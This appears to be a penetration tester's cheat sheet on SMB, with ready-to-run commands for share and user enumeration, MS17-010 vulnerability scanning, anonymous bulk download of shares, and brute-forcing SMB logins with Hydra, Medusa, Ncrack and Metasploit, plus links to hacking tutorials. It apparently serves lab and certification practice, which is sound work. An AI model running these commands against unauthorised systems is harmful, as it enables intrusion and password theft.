### SMB Enumeration
 #### Enumerate Hostname
    nmblookup -A [IP]
 #### List Shares
   ##### smbmap
    smbmap -H 192.168.10.1

    smbmap -R [shared dir] -H 192.168.10.1 = list contents

    smbmap -R [shared dir] -H 192.168.10.1 -A [filename.xml] -q = download content 

    smbmap -d active.htb -u [USER NAME] -p [PASSWORD] -H 192.168.10.1

    smbmap -d active.htb -u [USER NAME] -p [PASSWORD] -H 192.168.10.1 -R [Users] = download all contents in a filename Users

##### smbclient ( -L list shares, -N anonymous logon,)

    smbclient -L //192.168.10.1

    smbclient -L //10.10.10.100 -N

   download all contents in a filename folder[ ! password required]

    smbclient //192.168.10.1/filename

    > recurse ON
 
    > prompt OFF
 
    > mget *
 
 - Check Null Sessions
 - Overall Scan
    enum4linux -S 192.168.10.1



### Check for Vulnerabilities
    git clone https://github.com/peterpt/eternal_scanner.git && cd eternal_scanner
    
    nmap --script smb-vuln* -p 139,445 [ip]
    
    nmap -T4 -p445 --script smb-vuln-ms17-010 192.168.1.106
    
    use auxiliary/scanner/smb/smb_ms17_010

### Exploitation
 #### Hack SMB Login Password
    Hydra - hydra -L /root/Desktop/user.txt -P /root/Desktop/pass.txt 192.168.1.118 smb
    X-Hydra
    Medusa - medusa -h 192.168.1.118 -U /root/Desktop/user.txt -P /root/Desktop/pass.txt -M smbnt
    Ncrack - ncrack –U /root/Desktop/user.txt -P /root/Desktop/pass.txt 192.168.1.118 –p 445
    Metasploit
      use auxiliary/scanner/smb/smb_login
      msf exploit (smb_login)>set rhosts 192.168.1.118
      msf exploit (smb_login)>set user_file /root/Desktop/user.txt
      msf exploit (smb_login)>set pass_file /root/Desktop/pass.txt
      msf exploit (smb_login)>set stop_on_success true
      msf exploit (smb_login)>exploit


### NBTSCAN

nbtscan -r 10.0.2.0/24


### NMAP
nmap --script smb-enum-shares -p 139,445 [ip]

nmap --script smb-enum-services -p 445 192.168.10.1 -d

nmap -p 445 -A 192.168.1.101

nmap -p 1-65535 -T4 -O -A -v 10.0.2.15


SMB Enumeration Techniques using Windows Tools:

1. NetBIOS Enumerator (nbtenum)

http://nbtenum.sourceforge.net/
------------------------------------------------------------

SMB\RPC Enumeration (139/445):

    enum4linux –a 10.0.0.1
    nbtscan x.x.x.x // Discover Windows / Samba servers on subnet, finds Windows MAC addresses, netbios name and discover client workgroup / domain
    py 192.168.XXX.XXX 500 50000 dict.txt
    python /usr/share/doc/python-impacket-doc/examples/samrdump.py 192.168.XXX.XXX
    nmap IPADDR --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse
    smbclient -L INSERTIPADDRESS
    smbclient //INSERTIPADDRESS/tmp
    smbclient INSERTIPADDRESS ipc$ -U john
    
_____________________________________________________________________________________________________________________________________
### Other links

https://medium.com/@arnavtripathy98/smb-enumeration-for-penetration-testing-e782a328bf1b

https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html

https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/

https://www.hackingarticles.in/5-ways-to-hack-smb-login-password/

https://www.hackingarticles.in/3-ways-scan-eternal-blue-vulnerability-remote-pc/

https://www.hackingarticles.in/smb-penetration-testing-port-445/

https://www.hackingarticles.in/netbios-and-smb-penetration-testing-on-windows/

